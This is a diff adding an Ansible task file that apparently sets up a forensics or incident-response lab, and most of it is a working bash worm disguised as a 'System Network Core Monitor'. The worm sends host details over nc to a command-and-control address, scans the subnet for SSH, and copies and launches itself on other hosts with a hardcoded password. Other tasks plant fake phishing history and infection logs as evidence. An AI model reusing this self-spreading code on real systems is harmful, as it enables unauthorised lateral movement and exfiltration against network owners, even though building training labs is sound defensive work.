@@ -1,0 +1,111 @@
+---
+- name: Ensure worm directory exists
+  file:
+    path: "{{ worm_dir }}"
+    state: directory
+    owner: root
+    group: root
+    mode: "0755"
+
+- name: Drop worm binary on patient-zero
+  copy:
+    dest: "{{ worm_script }}"
+    owner: root
+    group: root
+    mode: "0755"
+    content: |
+      #!/bin/bash
+      # sysnet-core v2.1 — System Network Core Monitor
+      # Internal use only
+      SELF="$(readlink -f "$0")"
+      WORM_DIR="{{ worm_dir }}"
+      SPREAD_LOG="{{ spread_log }}"
+      BEACON_LOG="{{ worm_dir }}/beacon.log"
+      C2_HOST="{{ beacon_host }}"
+      C2_PORT="{{ beacon_port }}"
+      CRED_USER="{{ lab_user }}"
+      CRED_PASS="labpass"
+      SUBNET="{{ subnet_prefix }}"
+
+      send_beacon() {
+        {
+          echo "=== BEACON $(date -Is) ==="
+          echo "host=$(hostname)"
+          echo "ip=$(hostname -I | awk '{print $1}')"
+          echo "user=$(whoami)"
+          echo "uptime=$(uptime -p)"
+          echo "procs=$(ps aux | wc -l)"
+        } | nc -w 5 "$C2_HOST" "$C2_PORT" 2>/dev/null || true
+        echo "$(date -Is) beacon_sent host=$(hostname)" >> "$BEACON_LOG"
+      }
+
+      try_spread() {
+        local target="$1"
+        sshpass -p "$CRED_PASS" ssh -o StrictHostKeyChecking=no \
+          -o ConnectTimeout=3 -o BatchMode=no \
+          "$CRED_USER@$target" \
+          "mkdir -p $WORM_DIR && cat > $WORM_DIR/worm.sh && chmod +x $WORM_DIR/worm.sh" \
+          < "$SELF" 2>/dev/null || return 1
+        sshpass -p "$CRED_PASS" ssh -o StrictHostKeyChecking=no \
+          -o ConnectTimeout=3 -o BatchMode=no \
+          "$CRED_USER@$target" \
+          "nohup $WORM_DIR/worm.sh >/dev/null 2>&1 &" 2>/dev/null || true
+        echo "$(date -Is) SPREAD_OK target=$target" >> "$SPREAD_LOG"
+      }
+
+      scan_and_spread() {
+        local MY_IP
+        MY_IP=$(hostname -I | awk '{print $1}')
+        for last in $(seq 1 254); do
+          local target="${SUBNET}.${last}"
+          [ "$target" = "$MY_IP" ] && continue
+          nc -z -w 1 "$target" 22 2>/dev/null || continue
+          grep -q "SPREAD_OK target=$target" "$SPREAD_LOG" 2>/dev/null && continue
+          try_spread "$target"
+        done
+      }
+
+      mkdir -p "$WORM_DIR"
+      send_beacon
+      scan_and_spread
+
+- name: Seed spread log showing propagation to host-a and host-b
+  copy:
+    dest: "{{ spread_log }}"
+    owner: root
+    group: root
+    mode: "0644"
+    content: |
+      {{ ansible_date_time.iso8601 }} SPREAD_OK target={{ host_a_ip }}
+      {{ ansible_date_time.iso8601 }} SPREAD_OK target={{ host_b_ip }}
+
+- name: Plant bash history showing phishing attachment execution
+  copy:
+    dest: "/home/{{ lab_user }}/.bash_history"
+    owner: "{{ lab_user }}"
+    group: "{{ lab_user }}"
+    mode: "0600"
+    content: |
+      ls -la ~/Downloads/
+      cd ~/Downloads
+      ls -la sysnet-monitor-setup.bin
+      chmod +x sysnet-monitor-setup.bin
+      sudo ./sysnet-monitor-setup.bin
+      ls -la /opt/
+      ps aux | grep sysnet
+      exit
+
+- name: Write root-only install log (hard path for privesc)
+  copy:
+    dest: "{{ worm_dir }}/install.log"
+    owner: root
+    group: root
+    mode: "0600"
+    content: |
+      {{ ansible_date_time.iso8601 }} [WORM] DROPPER executed on {{ ansible_hostname }}
+      {{ ansible_date_time.iso8601 }} [WORM] PAYLOAD dropped to {{ worm_script }}
+      {{ ansible_date_time.iso8601 }} [WORM] PERSISTENCE sysnet-monitor.timer ENABLED
+      {{ ansible_date_time.iso8601 }} [WORM] C2 {{ beacon_host }}:{{ beacon_port }}
+      {{ ansible_date_time.iso8601 }} [WORM] SPREAD STARTED subnet={{ subnet_prefix }}.0/24
+      {{ ansible_date_time.iso8601 }} [WORM] SPREAD_OK target={{ host_a_ip }}
+      {{ ansible_date_time.iso8601 }} [WORM] SPREAD_OK target={{ host_b_ip }}
